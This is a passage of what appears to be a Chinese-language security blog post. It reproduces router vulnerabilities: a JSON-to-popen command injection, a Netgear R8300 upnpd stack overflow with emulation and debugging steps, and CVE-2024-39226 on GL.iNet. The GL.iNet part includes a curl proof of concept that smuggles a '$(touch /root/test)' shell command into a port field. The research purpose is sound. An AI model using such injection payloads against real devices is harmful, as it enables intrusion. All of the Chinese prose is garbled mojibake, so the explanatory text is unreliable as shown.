class="line">&#123;</span><br><span class="line">  &quot;jsonrpc&quot;: &quot;2.0&quot;,</span><br><span class="line">  &quot;method&quot;: &quot;action&quot;,</span><br><span class="line">  &quot;params&quot;: &#123;</span><br><span class="line">    &quot;rpc&quot;: &quot;file-copy&quot;,</span><br><span class="line">    &quot;input&quot;: &#123;</span><br><span class="line">      &quot;fileType&quot;: &quot;firmware&quot;,</span><br><span class="line">      &quot;source&quot;: &#123;</span><br><span class="line">        &quot;location-url&quot;: &quot;FILE://Firmware/[fileparam]&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;destination&quot;: &#123;</span><br><span class="line">        &quot;firmware-state&quot;: &quot;[destination]&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;firmware-option&quot;: &#123;</span><br><span class="line">        &quot;reboot-type&quot;: &quot;[uploadOption]&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åæ¥ä¸‹æ¥æ˜¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">json_object = operation_result;</span><br><span class="line">if ( !operation_result )</span><br><span class="line">    goto LABEL_19;</span><br><span class="line">json_string = (const char *)json_object_to_json_string(operation_result);</span><br><span class="line">sprintf(</span><br><span class="line">    curl_command_buffer,</span><br><span class="line">    &quot;curl %s --cookie &#x27;sessionid=%s&#x27; -X POST -H &#x27;Content-Type: application/json&#x27; -d &#x27;%s&#x27;&quot;,</span><br><span class="line">    url,</span><br><span class="line">    session_id,</span><br><span class="line">    json_string);</span><br><span class="line">curl_output_file = popen(curl_command_buffer, &quot;r&quot;);</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°json_stringæ˜¯é€šè¿‡operation_resultå¾—åˆ°çš„ï¼Œè€Œopration_resultå°±æ˜¯ä¸Šè¿°çš„jsonç»“æœï¼Œè€Œjsonéƒ¨åˆ†å­—ç¬¦ä¸²æ˜¯å¯æ§çš„ï¼Œå› æ­¤æ˜¾ç„¶å¯ä»¥è¿›è¡Œå‘½ä»¤çš„æ³¨å…¥</p><h2 id="CVE-2022-20700ï¼ˆä¼šè¯ä¼ªé€ ï¼‰"><a href="#CVE-2022-20700ï¼ˆä¼šè¯ä¼ªé€ ï¼‰" class="headerlink" title="CVE-2022-20700ï¼ˆä¼šè¯ä¼ªé€ ï¼‰"></a>CVE-2022-20700ï¼ˆä¼šè¯ä¼ªé€ ï¼‰</h2><p>é€šè¿‡ä¸Šè¿°å‘½ä»¤æ‰§è¡Œçš„æ¼æ´ï¼Œåˆ›å»º&#x2F;tmp&#x2F;websession&#x2F;ä¸‹çš„æ–‡æœ¬æ–‡ä»¶ï¼ˆè™½ç„¶åˆ°äº†æœ€åï¼Œç¯å¢ƒè¿˜æ˜¯æ²¡æœ‰æˆåŠŸä¾é è‡ªå·±å¯èµ·æ¥ï¼Œä½†æ˜¯æˆ‘ç”¨äº†cyberangelå¸ˆå‚…ä¹‹å‰å¯ç”¨çš„debianï¼Œä¹Ÿæ˜¯æˆåŠŸå•¦ï¼ï¼ï¼ï¼ï¼å¤ªqlï¼‰</p><h2 id="PSV-2020-0211ï¼ˆæ ˆæº¢å‡ºåˆ©ç”¨RCEï¼‰"><a href="#PSV-2020-0211ï¼ˆæ ˆæº¢å‡ºåˆ©ç”¨RCEï¼‰" class="headerlink" title="PSV-2020-0211ï¼ˆæ ˆæº¢å‡ºåˆ©ç”¨RCEï¼‰"></a>PSV-2020-0211ï¼ˆæ ˆæº¢å‡ºåˆ©ç”¨RCEï¼‰</h2><p>netgear R8300 1.0.2.130 çš„upnpä¸­å­˜åœ¨æ ˆæº¢å‡ºçš„æ¼æ´ï¼Œä¸»è¦å­¦ä¹ <strong>åˆ©ç”¨æ‰‹æ³•</strong>ï¼ŒNVram hookæ‰‹æ³•ï¼ŒPocç¼–å†™ ä»¥åŠ è°ƒè¯•æŠ€å·§</p><ul><li>**UPnP (Universal Plug and Play)**ï¼šç°åœ¨ç”±å¼€æ”¾è¿æ¥åŸºé‡‘ä¼šç®¡ç†çš„æ˜¯ä¸€å¥—ç½‘ç»œåè®®ï¼Œå®ƒå…è®¸ç½‘ç»œè®¾å¤‡æ— ç¼åœ°å‘ç°å½¼æ­¤åœ¨ç½‘ç»œä¸Šçš„å­˜åœ¨ï¼Œå¹¶ä¸ºæ•°æ®å…±äº«ã€é€šä¿¡å’Œå¨±ä¹å»ºç«‹åŠŸèƒ½ç½‘ç»œæœåŠ¡ã€‚</li></ul><p>UPnPä¼šå°†æŸä¸ªç«¯å£è¿æ¥åˆ°<strong>å¤šæ’­ç»„</strong>ï¼Œå³å…è®¸æ¥æ”¶å…¶ä»–å®¢æˆ·ç«¯ä¼ è¾“æ•°æ®ï¼ˆä¸€å¯¹å¤šï¼‰ã€æˆ–è®¸å°±æ˜¯é€šè¿‡è¿™ä¸ªæ¥ä½¿å¾—ç½‘ç»œè®¾å¤‡å¯ä»¥æ— ç¼å‘ç°å½¼æ­¤æ‰’ã€‘</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202504062349439.png" alt="image-20250228222327229"></p><p>æ¼æ´çœ‹ç€æ˜¯å¾ˆç®€å•çš„ï¼Œä½†æ˜¯ç”±äºsub_25E04æ˜¯é€šè¿‡strcpyæ¥æ ˆæº¢å‡ºçš„ï¼Œå› æ­¤\x00æˆªæ–­ä¾¿æ˜¯ä¸å¯ç»•è¿‡çš„éšœç¢ï¼Œè€ŒåŸä½œè€…çš„åˆ©ç”¨æ‰‹æ³•å€¼å¾—å­¦ä¹ </p><p>å¯åŠ¨æœåŠ¡ï¼šè¿™æ¬¡ä½¿ç”¨ç”¨æˆ·æ¨¡å¼è¿è¡Œ</p><p>å› ä¸ºæ¶‰åŠåˆ°nvramï¼Œä½¿ç”¨LD_PRELOAD HookæŠ€æœ¯ï¼Œç½‘ä¸Šæœ‰äººå·²ç»å†™å¥½äº†é’ˆå¯¹netgear R6250&#x2F;6400çš„nvram hookï¼Œå¯¹äºR8300ä¹Ÿæ˜¯é€‚ç”¨çš„ <a href="https://github.com/therealsaumil/custom_nvram/blob/master/custom_nvram_r6250.c">https://github.com/therealsaumil/custom_nvram/blob/master/custom_nvram_r6250.c</a></p><p>ä½¿ç”¨buildrootè¿›è¡Œäº¤å‰ç¼–è¯‘</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd ~/buildroot-2024.11/output/host/bin </span><br><span class="line">export PATH=$PATH:$(pwd)</span><br><span class="line">arm-linux-gcc -c -O2 -fPIC -Wall ./nvram1.c -o ./nvram1.o</span><br><span class="line">arm-linux-gcc -shared -nostdlib  ./nvram1.o -o ./nvram1.so</span><br></pre></td></tr></table></figure><p>ä¹‹ååˆ›å»º&#x2F;tmp&#x2F;nvram.ini</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">upnpd_debug_level=9</span><br><span class="line">lan_ipaddr=192.168.122.167</span><br><span class="line">hwver=R8500</span><br><span class="line">friendly_name=R8300</span><br><span class="line">upnp_enable=1</span><br><span class="line">upnp_turn_on=1</span><br><span class="line">upnp_advert_period=30</span><br><span class="line">upnp_advert_ttl=4</span><br><span class="line">upnp_portmap_entry=1</span><br><span class="line">upnp_duration=3600</span><br><span class="line">upnp_DHCPServerConfigurable=1</span><br><span class="line">wps_is_upnp=0</span><br><span class="line">upnp_sa_uuid=00000000000000000000</span><br><span class="line">lan_hwaddr=AA:BB:CC:DD:EE:FF</span><br></pre></td></tr></table></figure><p>ä¹‹åçš„lan_ipaddrè¿˜è¦è¿æ¥ï¼Œå› æ­¤è¦æŠŠipèµ·èµ·æ¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ip addr add 192.168.122.167/24 dev virbr0</span><br><span class="line">ip addr show virbr0</span><br></pre></td></tr></table></figure><p>æ˜¾ç¤ºå¯¹åº”çš„ipå°±ä»£è¡¨æˆåŠŸå•¦</p><p>ä¹‹å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot . ./qemu-arm-static -E LD_PRELOAD=&quot;./nvram1.so ./lib/libdl.so.0&quot; ./usr/sbin/upnpd</span><br><span class="line">sudo lsof -i | grep qemu                                                                     </span><br><span class="line">qemu-arm- 6267            root    3u  IPv4  93141      0t0  UDP *:1900 </span><br><span class="line">qemu-arm- 6267            root    4u  IPv4  93142      0t0  UDP *:45791 </span><br><span class="line">qemu-arm- 6267            root    5u  IPv4  93143      0t0  TCP *:5000 (LISTEN)</span><br></pre></td></tr></table></figure><p>å¦‚æ­¤ç¨‹åºå°±èµ·èµ·æ¥äº†ï¼Œå°±å¯ä»¥å¼€å§‹Pocçš„ç¼–å†™äº†</p><p>è°ƒè¯•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot . ./qemu-arm-static -g 1234 -E LD_PRELOAD=&quot;./nvram1.so ./lib/libdl.so.0&quot; ./usr/sbin/upnpd</span><br></pre></td></tr></table></figure><blockquote><p>ä¸€å¼€å§‹å‚»å‘—äº†ï¼Œå¿˜è®°äº†ç”¨æˆ·æ¨¡å¼å¯ä»¥ç›´æ¥è°ƒè¯•ï¼Œç›´æ¥attach pidè°ƒè¯•è°ƒçš„æ˜¯qemuçš„è¿›ç¨‹ï¼ˆï¼‰</p></blockquote><p>mainå‡½æ•°ä¸­æœ‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if ( daemon(1, 1) == -1 )</span><br><span class="line">&#123;</span><br><span class="line">  debug(3, &quot;Fail to run as daemon&quot;);</span><br><span class="line">  v13 = _errno_location();</span><br><span class="line">  exit(*v13);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>daemonä½¿å¾—å½“å‰è¿›ç¨‹ä¼šå˜æˆå®ˆæŠ¤è¿›ç¨‹å¹¶ä¿æŒå·¥ä½œç›®å½•ä¸å˜ï¼Œä½†æ˜¯è¿™ä¸ªä¼šè®©è¯¥è¿›ç¨‹è„±ç¦»gdbçš„æ§åˆ¶ï¼Œè€ƒè™‘nopæ‰ï¼ŒæˆåŠŸ~</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> R0   0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> R1   0xfffed504 â—‚â€” 0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> R2   0xfffed504 â—‚â€” 0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> R3   0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> R4   0x61</span><br><span class="line"> R5   0xfffed500 â—‚â€” 0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> R6   0xfffed504 â—‚â€” 0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> R7   0xfffed500 â—‚â€” 0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> R8   0xfffed504 â—‚â€” 0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> R9   0x10ab</span><br><span class="line"> R10  0x1</span><br><span class="line"> R11  0xc4584 â—‚â€” 7</span><br><span class="line"> R12  0x553dc â€”â–¸ 0xff60393c â—‚â€” push &#123;r4, lr&#125; /* 0xe92d4010 */</span><br><span class="line"> SP   0xfffeceb8 â—‚â€” 0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> PC   0xff603954 â—‚â€” ldrb ip, [r3] /* 0xe5d3c000 */</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM / arm / set emulate on ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">   0xff603948    ldrb   r4, [r2]</span><br><span class="line">   0xff60394c    cmp    r4, #0</span><br><span class="line">   0xff603950    popeq  &#123;r4, pc&#125;</span><br><span class="line"> â–º 0xff603954    ldrb   ip, [r3]</span><br><span class="line">   0xff603958    cmp    r4, ip</span><br><span class="line">   0xff60395c    addeq  r2, r2, #1</span><br><span class="line">   0xff603960    addeq  r3, r3, #1</span><br><span class="line">   0xff603964    beq    #0xff603948                   &lt;0xff603948&gt;</span><br><span class="line">    â†“</span><br><span class="line">   0xff603948    ldrb   r4, [r2]</span><br><span class="line">   0xff60394c    cmp    r4, #0</span><br><span class="line">   0xff603950    popeq  &#123;r4, pc&#125;</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">00:0000â”‚ sp 0xfffeceb8 â—‚â€” 0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line">01:0004â”‚    0xfffecebc â€”â–¸ 0xb62c â—‚â€” subs r7, r0, #0 /* 0xe2507000 */</span><br><span class="line">02:0008â”‚    0xfffecec0 â€”â–¸ 0xfffedefd â—‚â€” 0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line">03:000câ”‚    0xfffecec4 â€”â–¸ 0xfffed574 â—‚â€” 0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line">04:0010â”‚    0xfffecec8 â€”â–¸ 0x8df9 â—‚â€” 0xad</span><br><span class="line">05:0014â”‚    0xfffececc â€”â–¸ 0xfffef5f4 â—‚â€” mrchs p9, #1, r3, c2, c1, #1 /* 0x2e323931; &#x27;192.168.122.1&#x27; */</span><br><span class="line">06:0018â”‚    0xfffeced0 â€”â–¸ 0xfffed500 â—‚â€” 0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line">07:001câ”‚    0xfffeced4 â€”â–¸ 0x25e80 â—‚â€” subs sl, r0, #0 /* 0xe250a000 */</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"> â–º f 0 0xff603954</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br></pre></td></tr></table></figure><p>å‘é€å¤§é‡æ•°æ®å°±æˆåŠŸå‘ç°æ ˆæº¢å‡ºæ¼æ´</p><p>æ¼æ´åˆ©ç”¨ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">frimware/_R8300-V1.0.2.130_1.0.99.chk.extracted/squashfs-root </span><br><span class="line">&gt; checksec ./usr/sbin/upnpd     </span><br><span class="line">[*] &#x27;/home/s1nec-1o/frimware/_R8300-V1.0.2.130_1.0.99.chk.extracted/squashfs-root/usr/sbin/upnpd&#x27;</span><br><span class="line">    Arch:     arm-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8000)</span><br></pre></td></tr></table></figure><p>æ²¡pieï¼Œå°±å¯ç”¨äº†nx</p><p><code>SSD</code> å…¬å¼€çš„<a href="https://ssd-disclosure.com/ssd-advisory-netgear-nighthawk-r8300-upnpd-preauth-rce/">æ¼æ´ç»†èŠ‚</a>ä¸­ç»™å‡ºäº†ä¸€ä¸ªæ–¹æ¡ˆï¼šé€šè¿‡ <code>stack reuse</code> çš„æ–¹å¼æ¥ç»•è¿‡è¯¥é™åˆ¶ã€‚å…·ä½“æ€è·¯ä¸ºï¼Œå…ˆé€šè¿‡ <code>socket</code> å‘é€ç¬¬ä¸€æ¬¡æ•°æ®ï¼Œå¾€æ ˆä¸Šå¡«å……ç›¸åº”çš„ <code>rop payload</code>ï¼ŒåŒæ—¶ä¿è¯ä¸ä¼šé€ æˆç¨‹åºå´©æºƒï¼›å†é€šè¿‡ <code>socket</code> å‘é€ç¬¬äºŒæ¬¡æ•°æ®ç”¨äºè¦†ç›–æ ˆä¸Šçš„è¿”å›åœ°å€ï¼Œå¡«å……çš„è¿”å›åœ°å€ç”¨æ¥å®ç° <code>stack pivot</code>ï¼Œå³åŠ«æŒæ ˆæŒ‡é’ˆä½¿å…¶æŒ‡å‘ç¬¬ä¸€æ¬¡å‘é€çš„ <code>payload</code> å¤„ï¼Œç„¶åå†å¤ç”¨ä¹‹å‰çš„ <code>payload</code> ä»¥å®Œæˆæ¼æ´åˆ©ç”¨ã€‚<code>SSD</code> å…¬å¼€çš„æ¼æ´ç»†èŠ‚ä¸­çš„ç¤ºæ„å›¾å¦‚ä¸‹ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202504062349440.png" alt="image-20250301114232391"></p><p>è¿™é‡Œå€Ÿç”¨çš„ROPæœ‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:000230F0                 ADD             SP, SP, #0x20C</span><br><span class="line">.text:000230F4                 ADD             SP, SP, #0x1000</span><br><span class="line">.text:000230F8                 POP             &#123;R4-R11,PC&#125;</span><br></pre></td></tr></table></figure><p>å‡æ ˆå¹¶ä¸”popå‡ºæ‰€æœ‰å…³é”®å¯„å­˜å™¨ï¼Œå¦‚æ­¤åªéœ€è¦æå‰æ„é€ å¥½å¯¹åº”çš„payloadå°±å¯ä»¥è¿›è¡ŒROPå•¦ï¼</p><p>ä½†æ˜¯æˆ‘åœ¨æ„é€ çš„æ—¶å€™æ€»æ˜¯å‘ç°å®ƒä¼šå¤±è´¥ï¼Œå°±ç®—æ˜¯è¿è¡Œçš„æ˜¯å‘å¸ƒè€…å†™çš„pocï¼ˆï¼‰æ€»æ˜¯æ–­åœ¨ä¸€äº›å¥‡æ€ªçš„åœ°æ–¹ï¼Œç ”ç©¶è®¸ä¹…åæ”¾å¼ƒï¼Œäº†è§£åˆ©ç”¨æ‰‹æ³•å³å¯ï¼Œ<strong>reuse stackï¼</strong></p><h2 id="CVE-2024-39226"><a href="#CVE-2024-39226" class="headerlink" title="CVE-2024-39226"></a>CVE-2024-39226</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H &#x27;glinet: 1&#x27; 127.0.0.1/rpc -d &#x27;&#123;&quot;method&quot;:&quot;call&quot;, &quot;params&quot;:[&quot;&quot;, &quot;s2s&quot;, &quot;enable_echo_server&quot;, &#123;&quot;port&quot;: &quot;7 $(touch /root/test)&quot;&#125;]&#125;&#x27;</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯Pocï¼Œå‘ç°é€šè¿‡æœ¬åœ°&#x2F;rpcè®¿é—®ï¼Œå› æ­¤çœ‹&#x2F;rpcçš„api</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location = /rpc &#123;</span><br><span class="line">    content_by_lua_file /usr/share/gl-ngx/oui-rpc.lua;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡&#x2F;usr&#x2F;share&#x2F;gl-ngx&#x2F;oui-rpc.lua;æ–‡ä»¶å¤„ç†</p><p>å®šä¹‰äº†å¤šç§æ–¹æ³•ï¼ŒPocä¸­ä½¿ç”¨callæ–¹æ³•ç»™å‡ºparamså˜é‡ï¼ˆoui-rpc.luaå®šä¹‰äº†å¾ˆå¤šçš„æ–¹æ³•ï¼Œé€šè¿‡å‚æ•°methodä¼ å…¥ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">local function rpc_method_call(id, params)</span><br><span class="line">    if #params &lt; 3 then  ---params è‡³å°‘ä¸‰ä¸ªå‚æ•°</span><br><span class="line">        local resp = rpc.error_res  ponse(id, rpc.ERROR_CODE_INVALID_PARAMS)</span><br><span class="line">        ngx.say(cjson.encode(resp))</span><br><span class="line">        return</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    local sid, object, method, args = params[1], params[2], params[3], params[4] -- &quot;&quot; &quot;s2s&quot; &quot;enable_echo_server&quot; &quot;&#123;&quot;port&quot;: &quot;7 $(touch /root/test)&quot;&#125;&quot;</span><br><span class="line"></span><br><span class="line">    if type(sid) ~= &quot;string&quot; or type(object) ~= &quot;string&quot; or type(method) ~= &quot;string&quot; then</span><br><span class="line">        local resp = rpc.error_response(id, rpc.ERROR_CODE_INVALID_PARAMS)</span><br><span class="line">        ngx.say(cjson.encode(resp))</span><br><span class="line">        return  </span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    if args and type(args) ~= &quot;table&quot; then   ---- ä¸Šè¿°ä¸ºä¸€äº›å‚æ•°ç±»å‹çš„éªŒè¯</span><br><span class="line">        local resp = rpc.error_response(id, rpc.ERROR_CODE_INVALID_PARAMS)</span><br><span class="line">        ngx.say(cjson.encode(resp))</span><br><span class="line">        return</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    ngx.ctx.sid = sid</span><br><span class="line"></span><br><span class="line">    if not rpc.is_no_auth(object, method) then</span><br><span class="line">        if not rpc.access(&quot;rpc&quot;, object .. &quot;.&quot; .. method) then   --- é€šè¿‡æœ¬åœ°è°ƒç”¨æ˜¯ä¸éœ€è¦è¿›è¡Œèº«ä»½éªŒè¯çš„</span><br><span class="line">            local resp = rpc.error_response(id, rpc.ERROR_CODE_ACCESS)</span><br><span class="line">            ngx.say(cjson.encode(resp))</span><br><span class="line">            return</span><br><span class="line">        end</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    local res = rpc.call(object, method, args) --- è°ƒç”¨rpc.lua ä¸‹çš„ call å¹¶ä¼ å…¥å‚æ•°</span><br><span class="line">    if type(res) == &quot;number&quot; then</span><br><span class="line">        local resp = rpc.error_response(id, res)</span><br><span class="line">        ngx.say(cjson.encode(resp))</span><br><span class="line">        return</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    if type(res) ~= &quot;table&quot; then res = &#123;&#125; end</span><br><span class="line"></span><br><span class="line">    local resp = rpc.result_response(id, res)</span><br><span class="line">    ngx.say(cjson.encode(resp))</span><br><span class="line">end</span><br><span class="line">M.call = function(object, method, args)  -- s2s enable_echo_server &#123;&quot;port&quot;: &quot;7 $(touch /root/test)&quot;&#125;</span><br><span class="line">    ngx.log(ngx.DEBUG, &quot;call: &#x27;&quot;, object, &quot;.&quot;, method, &quot;&#x27;&quot;)</span><br><span class="line"></span><br><span class="line">    if not objects[object] then</span><br><span class="line">        local script = &quot;/usr/lib/oui-httpd/rpc/&quot; .. object</span><br><span class="line">        if not fs.access(script) then   --- è°ƒç”¨ fs çš„ accesså‡½æ•°ï¼Œå³åˆ¤æ–­æ˜¯å¦å­˜åœ¨è¯¥ è„šæœ¬</span><br><span class="line">            return glc_call(object, method, args)</span><br><span class="line">        end</span><br><span class="line"></span><br><span class="line">        local ok, tb = pcall(dofile, script)  -- ä½¿ç”¨ pcall å®‰å…¨æ‰§è¡Œ dofile åŠ è½½è„šæœ¬ ï¼Œtbæ˜¯å‡½æ•°è¡¨</span><br><span class="line">        if not ok then               --- å› ä¸º s2s.so 